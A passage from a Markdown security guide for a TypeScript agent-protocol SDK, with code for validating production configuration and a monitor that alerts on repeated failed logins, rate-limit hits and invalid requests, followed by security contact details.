    sslVerify: process.env.AMP_SSL_VERIFY !== 'false',
    corsOrigins: (process.env.AMP_CORS_ORIGINS || '').split(',').filter(Boolean),
    logLevel: process.env.AMP_LOG_LEVEL || 'info'
  };
  
  // Validate production configuration
  if (config.nodeEnv === 'production') {
    validateProductionConfig(config);
  }
  
  return config;
}

function validateProductionConfig(config: SecurityConfig): void {
  const errors: string[] = [];
  
  if (!config.secretKey || config.secretKey.length < 32) {
    errors.push('AMP_SECRET_KEY must be at least 32 characters in production');
  }
  
  if (config.secretKey === 'debug-key-change-in-production') {
    errors.push('Default secret key detected - must change in production');
  }
  
  if (!config.sslVerify) {
    errors.push('SSL verification cannot be disabled in production');
  }
  
  if (config.corsOrigins.includes('*')) {
    errors.push('Wildcard CORS origins not allowed in production');
  }
  
  if (errors.length > 0) {
    throw new Error(`Production security validation failed:\n${errors.join('\n')}`);
  }
}
```

### Security Monitoring
```typescript
export class ProductionSecurityMonitor {
  private suspiciousActivities = new Map<string, number>();
  private alertThresholds = {
    failedAuth: 10,
    rateLimitHits: 50,
    invalidRequests: 20
  };
  
  monitorAuthentication(agentId: string, success: boolean, sourceIP: string): void {
    if (!success) {
      const key = `auth:${agentId}:${sourceIP}`;
      const count = (this.suspiciousActivities.get(key) || 0) + 1;
      this.suspiciousActivities.set(key, count);
      
      if (count >= this.alertThresholds.failedAuth) {
        this.triggerAlert('brute_force_attack', {
          agentId,
          sourceIP,
          failedAttempts: count
        });
      }
    }
  }
  
  monitorRateLimit(identifier: string, sourceIP: string): void {
    const key = `rate:${identifier}:${sourceIP}`;
    const count = (this.suspiciousActivities.get(key) || 0) + 1;
    this.suspiciousActivities.set(key, count);
    
    if (count >= this.alertThresholds.rateLimitHits) {
      this.triggerAlert('dos_attempt', {
        identifier,
        sourceIP,
        rateLimitHits: count
      });
    }
  }
  
  monitorInvalidRequests(sourceIP: string): void {
    const key = `invalid:${sourceIP}`;
    const count = (this.suspiciousActivities.get(key) || 0) + 1;
    this.suspiciousActivities.set(key, count);
    
    if (count >= this.alertThresholds.invalidRequests) {
      this.triggerAlert('scanner_activity', {
        sourceIP,
        invalidRequests: count
      });
    }
  }
  
  private triggerAlert(alertType: string, details: Record<string, any>): void {
    const alert = {
      timestamp: new Date().toISOString(),
      alertType,
      severity: 'high',
      details
    };
    
    console.error('SECURITY ALERT:', alert);
    
    // Send to monitoring system
    this.sendToMonitoringSystem(alert);
    
    // Consider automated response
    this.considerAutomatedResponse(alertType, details);
  }
  
  private sendToMonitoringSystem(alert: any): void {
    // Implementation depends on monitoring system
    // Examples: Datadog, New Relic, CloudWatch, etc.
  }
  
  private considerAutomatedResponse(alertType: string, details: any): void {
    // Implement automated response based on alert type
    switch (alertType) {
      case 'brute_force_attack':
        // Temporarily block IP
        this.blockIP(details.sourceIP, 3600); // 1 hour
        break;
      case 'dos_attempt':
        // Increase rate limiting for IP
        this.enhanceRateLimit(details.sourceIP);
        break;
    }
  }
  
  private blockIP(ip: string, durationSeconds: number): void {
    // Implement IP blocking logic
    console.warn(`Blocking IP ${ip} for ${durationSeconds} seconds`);
  }
  
  private enhanceRateLimit(ip: string): void {
    // Implement enhanced rate limiting
    console.warn(`Enhancing rate limits for IP ${ip}`);
  }
}
```

---

## Contact Information

### Security Team
- **Email**: security@agentmeshprotocol.io
- **Emergency**: security-emergency@agentmeshprotocol.io
- **PGP Key**: https://agentmeshprotocol.io/security/pgp-key

### Reporting Security Issues
1. **GitHub Security Advisories**: Preferred for vulnerability reports
2. **NPM Security**: Report package-specific issues to npm security team
3. **Browser Security**: Report browser-specific issues through browser vendors

---

**Document Version**: 1.0  
**Last Updated**: 2025-01-27  
**Next Review**: 2025-04-27  
**Node.js Version**: 18.0+  
**TypeScript Version**: 5.0+

*This document covers security best practices specific to the AMP TypeScript SDK. For general protocol security, see the main protocol security documentation.*